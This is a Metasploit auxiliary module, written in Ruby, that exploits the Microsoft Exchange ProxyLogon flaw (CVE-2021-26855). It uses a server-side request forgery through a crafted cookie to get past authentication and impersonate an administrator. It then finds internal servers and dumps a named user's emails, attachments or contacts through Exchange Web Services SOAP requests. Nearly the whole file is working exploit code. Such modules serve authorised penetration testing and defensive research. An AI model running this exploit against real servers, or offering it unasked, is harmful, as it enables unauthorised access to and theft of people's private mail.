##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# begin auxiliary class
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Exchange ProxyLogon Collector',
        'Description' => %q{
          This module exploit a vulnerability on Microsoft Exchange Server that
          allows an attacker bypassing the authentication and impersonating as the
          admin (CVE-2021-26855).

          By taking advantage of this vulnerability, it is possible to dump all
          mailboxes (emails, attachments, contacts, ...).

          This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012,
          Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009,
          Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010).

          All components are vulnerable by default.
        },
        'Author' => [
          'Orange Tsai', # Dicovery (Officially acknowledged by MSRC)
          'GreyOrder', # PoC (https://github.com/GreyOrder)
          'mekhalleh (RAMELLA Sébastien)' # Module author independent researcher (work at Zeop Entreprise)
        ],
        'References' => [
          ['CVE', '2021-26855'],
          ['LOGO', 'https://proxylogon.com/images/logo.jpg'],
          ['URL', 'https://proxylogon.com/'],
          ['URL', 'https://aka.ms/exchangevulns'],
          ['URL', 'https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/distinguishedfolderid'],
          ['URL', 'https://github.com/3gstudent/Homework-of-Python/blob/master/ewsManage.py']
        ],
        'DisclosureDate' => '2021-03-02',
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Actions' => [
          [
            'Dump (Contacts)', {
              'Description' => 'Dump user contacts from exchange server',
              'id_attribute' => 'contacts'
            }
          ],
          [
            'Dump (Emails)', {
              'Description' => 'Dump user emails from exchange server'
            }
          ]
        ],
        'DefaultAction' => 'Dump (Emails)',
        'Notes' => {
          'AKA' => ['ProxyLogon']
        }
      )
    )

    register_options([
      OptBool.new('ATTACHMENTS', [true, 'Dump documents attached to an email', true]),
      OptString.new('EMAIL', [true, 'The email account what you want dump']),
      OptString.new('FOLDER', [true, 'The email folder what you want dump', 'inbox']),
      OptEnum.new('METHOD', [true, 'HTTP Method to use for the check (only).', 'POST', ['GET', 'POST']]),
      OptString.new('TARGET', [false, 'Force the name of the internal Exchange server targeted'])
    ])

    register_advanced_options([
      OptInt.new('MaxEntries', [false, 'Override the maximum number of object to dump', 2147483647])
    ])
  end

  XMLNS = { 't' => 'http://schemas.microsoft.com/exchange/services/2006/types' }.freeze

  def dump_contacts(server_name)
    ssrf = "#{server_name}/EWS/Exchange.asmx?a=~#{random_ssrf_id}"

    response = send_xml('POST', ssrf, soap_countitems(action['id_attribute']))
    if response.body =~ /Success/
      print_good("Successfuly connected to: #{action['id_attribute']}")
      xml = Nokogiri::XML.parse(response.body)

      folder_id = xml.at_xpath('//t:ContactsFolder/t:FolderId', XMLNS)&.values&.at(0)
      print_status("Selected folder: #{action['id_attribute']} (#{folder_id})")

      total_count = xml.at_xpath('//t:ContactsFolder/t:TotalCount', XMLNS)&.content
      print_status("Number of contact found: #{total_count}")

      if total_count.to_i > datastore['MaxEntries']
        print_warning("Number of contact recalculated due to max entries: #{datastore['MaxEntries']}")
        total_count = datastore['MaxEntries'].to_s
      end

      response = send_xml('POST', ssrf, soap_listitems(action['id_attribute'], total_count))
      xml = Nokogiri::XML.parse(response.body)

      print_status(message("Processing dump of #{total_count} items"))
      data = xml.xpath('//t:Items/t:Contact', XMLNS)
      if data.empty?
        print_status('The user has no contacts')
      else
        write_loot("#{datastore['EMAIL']}_#{action['id_attribute']}", data.to_s)
      end
    end
  end

  def dump_emails(server_name)
    ssrf = "#{server_name}/EWS/Exchange.asmx?a=~#{random_ssrf_id}"

    response = send_xml('POST', ssrf, soap_countitems(datastore['FOLDER']))
    if response.body =~ /Success/
      print_good("Successfuly connected to: #{datastore['FOLDER']}")
      xml = Nokogiri::XML.parse(response.body)

      folder_id = xml.at_xpath('//t:Folder/t:FolderId', XMLNS)&.values&.at(0)
      print_status("Selected folder: #{datastore['FOLDER']} (#{folder_id})")

      total_count = xml.at_xpath('//t:Folder/t:TotalCount', XMLNS)&.content
      print_status("Number of email found: #{total_count}")

      if total_count.to_i > datastore['MaxEntries']
        print_warning("Number of email recalculated due to max entries: #{datastore['MaxEntries']}")
        total_count = datastore['MaxEntries'].to_s
      end

      print_status(message("Processing dump of #{total_count} items"))
      download_items(total_count, ssrf)
    end
  end

  def download_attachments(item_id, ssrf)
    response = send_xml('POST', ssrf, soap_listattachments(item_id))
    xml = Nokogiri::XML.parse(response.body)

    xml.xpath('//t:Message/t:Attachments/t:FileAttachment', XMLNS).each do |item|
      item_id = item.at_xpath('./t:AttachmentId', XMLNS)&.values&.at(0)

      response = send_xml('POST', ssrf, soap_downattachment(item_id))
      data = Nokogiri::XML.parse(response.body)

      filename = data.at_xpath('//t:FileAttachment/t:Name', XMLNS)&.content
      ctype = data.at_xpath('//t:FileAttachment/t:ContentType', XMLNS)&.content
      content = data.at_xpath('//t:FileAttachment/t:Content', XMLNS)&.content

      print_status("   -> attachment: #{item_id} (#{filename})")
      write_loot("#{datastore['EMAIL']}_#{datastore['FOLDER']}", Rex::Text.decode_base64(content), filename, ctype)
    end
  end

  def download_items(total_count, ssrf)
    response = send_xml('POST', ssrf, soap_listitems(datastore['FOLDER'], total_count))
    xml = Nokogiri::XML.parse(response.body)

    xml.xpath('//t:Items/t:Message', XMLNS).each do |item|
      item_info = item.at_xpath('./t:ItemId', XMLNS)&.values
      next if item_info.nil?

      print_status("Download item: #{item_info[1]}")

      response = send_xml('POST', ssrf, soap_downitem(item_info[0], item_info[1]))
      data = Nokogiri::XML.parse(response.body)

      email = data.at_xpath('//t:Message/t:MimeContent', XMLNS)&.content
      write_loot("#{datastore['EMAIL']}_#{datastore['FOLDER']}", Rex::Text.decode_base64(email))

      attachments = item.at_xpath('./t:HasAttachments', XMLNS)&.content
      if datastore['ATTACHMENTS'] && attachments == 'true'
        download_attachments(item_info[0], ssrf)
      end
      print_status
    end
  end

  def message(msg)
    "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
  end

  def random_ssrf_id
    # https://en.wikipedia.org/wiki/2,147,483,647 (lol)
    # max. 2147483647
    rand(1941962752..2147483647)
  end

  def request_autodiscover(server_name)
    xmlns = { 'xmlns' => 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a' }

    response = send_xml('POST', "#{server_name}/autodiscover/autodiscover.xml?a=~#{random_ssrf_id}", soap_autodiscover)

    case response.body
    when %r{<ErrorCode>500</ErrorCode>}
      fail_with(Failure::NotFound, 'No Autodiscover information was found')
    when %r{<Action>redirectAddr</Action>}
      fail_with(Failure::NotFound, 'No email address was found')
    end

    xml = Nokogiri::XML.parse(response.body)

    legacy_dn = xml.at_xpath('//xmlns:User/xmlns:LegacyDN', xmlns)&.content
    fail_with(Failure::NotFound, 'No \'LegacyDN\' was found') if legacy_dn.empty?

    server = ''
    owa_urls = []
    xml.xpath('//xmlns:Account/xmlns:Protocol', xmlns).each do |item|
      type = item.at_xpath('./xmlns:Type', xmlns)&.content
      if type == 'EXCH'
        server = item.at_xpath('./xmlns:Server', xmlns)&.content
      end

      next unless type == 'WEB'

      item.xpath('./xmlns:Internal/xmlns:OWAUrl', xmlns).each do |owa_url|
        owa_urls << owa_url.content
      end
    end
    fail_with(Failure::NotFound, 'No \'Server ID\' was found') if server.nil? || server.empty?
    fail_with(Failure::NotFound, 'No \'OWAUrl\' was found') if owa_urls.empty?

    return([server, legacy_dn, owa_urls])
  end

  def send_http(method, ssrf, data: '', ctype: 'application/x-www-form-urlencoded')
    request = {
      'method' => method,
      'uri' => @random_uri,
      'cookie' => "X-BEResource=#{ssrf};",
      'ctype' => ctype
    }
    request = request.merge({ 'data' => data }) unless data.empty?

    received = send_request_cgi(request)
    fail_with(Failure::TimeoutExpired, 'Server did not respond in an expected way') unless received

    received
  end

  def send_xml(method, ssrf, data, ctype: 'text/xml; charset=utf-8')
    send_http(method, ssrf, data: data, ctype: ctype)
  end

  def soap_autodiscover
    <<~SOAP
      <?xml version="1.0" encoding="utf-8"?>
      <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
        <Request>
          <EMailAddress>#{datastore['EMAIL']}</EMailAddress>
          <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
        </Request>
      </Autodiscover>
    SOAP
  end

  def soap_countitems(folder_id)
    <<~SOAP
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
      xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <m:GetFolder>
            <m:FolderShape>
              <t:BaseShape>Default</t:BaseShape>
            </m:FolderShape>
            <m:FolderIds>
              <t:DistinguishedFolderId Id="#{folder_id}">
                <t:Mailbox>
                  <t:EmailAddress>#{datastore['EMAIL']}</t:EmailAddress>
                </t:Mailbox>
              </t:DistinguishedFolderId>
            </m:FolderIds>
          </m:GetFolder>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def soap_listattachments(item_id)
    <<~SOAP
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
      xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <m:GetItem>
            <m:ItemShape>
              <t:BaseShape>IdOnly</t:BaseShape>
              <t:AdditionalProperties>
                <t:FieldURI FieldURI="item:Attachments" />
              </t:AdditionalProperties>
            </m:ItemShape>
            <m:ItemIds>
              <t:ItemId Id="#{item_id}" />
            </m:ItemIds>
          </m:GetItem>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def soap_listitems(folder_id, max_entries)
    <<~SOAP
      <?xml version='1.0' encoding='utf-8'?>
      <soap:Envelope
      xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'
      xmlns:t='http://schemas.microsoft.com/exchange/services/2006/types'
      xmlns:m='http://schemas.microsoft.com/exchange/services/2006/messages'
      xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>
        <soap:Body>
          <m:FindItem Traversal='Shallow'>
            <m:ItemShape>
              <t:BaseShape>AllProperties</t:BaseShape>
            </m:ItemShape>
            <m:IndexedPageItemView MaxEntriesReturned="#{max_entries}" Offset="0" BasePoint="Beginning" />
            <m:ParentFolderIds>
              <t:DistinguishedFolderId Id='#{folder_id}'>
                <t:Mailbox>
                  <t:EmailAddress>#{datastore['EMAIL']}</t:EmailAddress>
                </t:Mailbox>
              </t:DistinguishedFolderId>
            </m:ParentFolderIds>
          </m:FindItem>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def soap_downattachment(item_id)
    <<~SOAP
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
      xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <m:GetAttachment>
            <m:AttachmentIds>
              <t:AttachmentId Id="#{item_id}" />
            </m:AttachmentIds>
          </m:GetAttachment>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def soap_downitem(id, change_key)
    <<~SOAP
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
      xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <m:GetItem>
            <m:ItemShape>
              <t:BaseShape>IdOnly</t:BaseShape>
              <t:IncludeMimeContent>true</t:IncludeMimeContent>
            </m:ItemShape>
            <m:ItemIds>
              <t:ItemId Id="#{id}" ChangeKey="#{change_key}" />
            </m:ItemIds>
          </m:GetItem>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def write_loot(type, data, name = '', ctype = 'text/plain')
    loot_path = store_loot(type, ctype, datastore['RHOSTS'], data, name, '')
    print_good("File saved to #{loot_path}")
  end

  def run
    @proto = (ssl ? 'https' : 'http')
    @random_uri = normalize_uri('ecp', "#{Rex::Text.rand_text_alpha(1..3)}.js")

    print_status(message('Attempt to exploit for CVE-2021-26855'))

    # request for internal server name.
    response = send_http(datastore['METHOD'], "localhost~#{random_ssrf_id}")
    if response.code != 500 || !response.headers.to_s.include?('X-FEServer')
      fail_with(Failure::NotFound, 'No \'X-FEServer\' was found')
    end
    server_name = response.headers['X-FEServer']
    print_status("Internal server name (#{server_name})")

    # get informations by autodiscover request.
    print_status(message('Sending autodiscover request'))
    server_id, legacy_dn, owa_urls = request_autodiscover(server_name)

    print_status("Server: #{server_id}")
    print_status("LegacyDN: #{legacy_dn}")
    print_status("Internal target(s): #{owa_urls.join(', ')}")

    # selecting target
    print_status(message('Selecting the first internal server to respond'))
    if datastore['TARGET'].nil? || datastore['TARGET'].empty?
      target = ''
      owa_urls.each do |url|
        host = url.split('://')[1].split('.')[0].downcase
        next unless host != server_name.downcase

        response = send_http('GET', "#{host}/EWS/Exchange.asmx?a=~#{random_ssrf_id}")
        next unless response.code == 200

        target = host
        print_good("Targeting internal: #{url}")

        break
      end
      fail_with(Failure::NotFound, 'No internal target was found') if target.empty?
    else
      target = datastore['TARGET']
      print_good("Targeting internal forced to: #{target}")
    end

    # run action
    case action.name
    when /Dump \(Contacts\)/
      print_status(message("Attempt to dump contacts for <#{datastore['EMAIL']}>"))
      dump_contacts(target)
    when /Dump \(Emails\)/
      print_status(message("Attempt to dump emails for <#{datastore['EMAIL']}>"))
      dump_emails(target)
    end
  end

end
